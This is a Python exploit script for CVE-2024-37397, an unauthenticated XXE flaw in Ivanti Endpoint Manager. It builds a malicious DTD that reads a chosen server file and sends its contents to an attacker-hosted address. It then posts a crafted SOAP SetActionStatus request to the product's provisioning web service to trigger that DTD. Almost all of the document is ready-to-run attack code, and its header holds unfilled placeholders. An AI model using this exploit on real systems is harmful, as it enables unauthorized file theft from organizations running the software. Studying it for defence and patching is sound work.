# ---------------------------------------------------------
# Exploit Title: Ivanti Endpoint Manager Unauthorized XXE Exploit
# CVE: CVE-2024-37397
# Date: 2024-09-17
# Exploit Author: @D4mianWayne
# Vulnerability Discovered by: 06fe5fd2bc53027c4a3b7e395af0b850e7b8a044 (Trend Micro)
# Vendor Homepage: https://www.ivanti.com/
# Software Link: https://www.ivanti.com/products/ivanti-endpoint-manager
# Version: Affected versions [mention affected versions]
# Tested on: Ivanti Endpoint Manager version X.X.X
# CVE Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-37397
# ---------------------------------------------------------



import requests
import argparse
import urllib3

def print_banner():
    print("="*50)
    print("     Exploit Script for CVE-2024-37397")
    print("     Unauthorized XXE Exploit in Ivanti Endpoint Manager")
    print("="*50)
    print("     Created by @D4mianWayne")
    print("     Date: 2024-09-17")
    print("="*50)

# Call the function to display the banner



def log(message, status="info"):
    if status == "success":
        print(f"[+] {message}")
    elif status == "log":
        print(f"[*] {message}")
    else:
        print(f"[-] {message}")

# Function to create the malicious DTD file since this is a blind XXE so we are performing an
# OOB XXE attack and exfiltrate data

def create_malicious_dtd(file_path, local_ip):
    dtd_content = f'''<!ENTITY % file SYSTEM "file:///{file_path}">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://{local_ip}:4444/?content=%file;'>">
%eval;
%exfiltrate;
'''
    with open('malicious.dtd', 'w') as dtd_file:
        dtd_file.write(dtd_content)
    log(f"Malicious DTD created at malicious.dtd", "success")

# SOAP Request for invoking SetActionStatus, a valid historyEntryIDN is required for certain checks to be 
# fulfilled but I believe it can be bruteforced to work. Additionally, the actionXml content are being passed to the
# ImportXml function which was found to be vulnerable to XXE as XmlUrlXmlResolver wasn't set to null explicitly.

def send_soap_request(target_url, local_ip):
  log("Crafting SOAP Request to invole SetActionStatus", "log")
  soap_payload = '''<?xml version="1.0" encoding="utf-8"?>
  <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
      <SetActionStatus xmlns="http://tempuri.org/">
        <historyTaskIDN>100</historyTaskIDN>
        <historyEntryIDN>5</historyEntryIDN>
        <nextHistoryEntryIDN>0</nextHistoryEntryIDN>
        <actionState>NEED_REBOOT</actionState>
        <internalRetval>1</internalRetval>
        <externalRetval>1</externalRetval>
        <strCapturedText>string</strCapturedText>
        <Variables>
          <UserVariable>
            <Name>string</Name>
            <Value>string</Value>
            <VariableOperation>add</VariableOperation>
          </UserVariable>
          <UserVariable>
            <Name>string</Name>
            <Value>string</Value>
            <VariableOperation>add</VariableOperation>
          </UserVariable>
        </Variables>
        <actionXml><![CDATA[
  <!DOCTYPE a [
  <!ENTITY % asd SYSTEM "http://{}/malicious.dtd">
  %asd;
  %c; 
  ]>
  <a></a>
  ]]></actionXml>
      </SetActionStatus>
    </soap:Body>
  </soap:Envelope>'''.format(local_ip)

  # Define the headers
  headers = {
      "Content-Type": "text/xml; charset=utf-8",
      "Soapaction": '"http://tempuri.org/SetActionStatus"'
  }

  # The target URL
  log("Sending Request.....", "log")
  url = "{}/LANDesk/ManagementSuite/Core/ProvisioningWebService/WebService.asmx".format(target_url)

  # Send the POST request
  try:
    response = requests.post(url, data=soap_payload, headers=headers, verify=False)
  # Print the response from the server
    log("Request Successfully Sent!", "success")
    print(f"Response Status Code: {response.status_code}")
    print("Response Content:")
    print(response.text)
  except Exception as E:
    log("Error occured: {}".format(E), "log")


def main():
    parser = argparse.ArgumentParser(description="XXE Exploit Script")
    parser.add_argument("target_ip", help="Target URL of the web service")
    parser.add_argument("file_path", help="Path of the file to exfiltrate")
    parser.add_argument("local_ip", help="Local IP address for DTD hosting")
    
    args = parser.parse_args()

    # Create the malicious DTD
    create_malicious_dtd(args.file_path, args.local_ip)

    # Start the HTTP server in a separate thread
    # Send the SOAP request
    send_soap_request(args.target_ip, args.local_ip)

if __name__ == "__main__":
    print_banner()
    main()
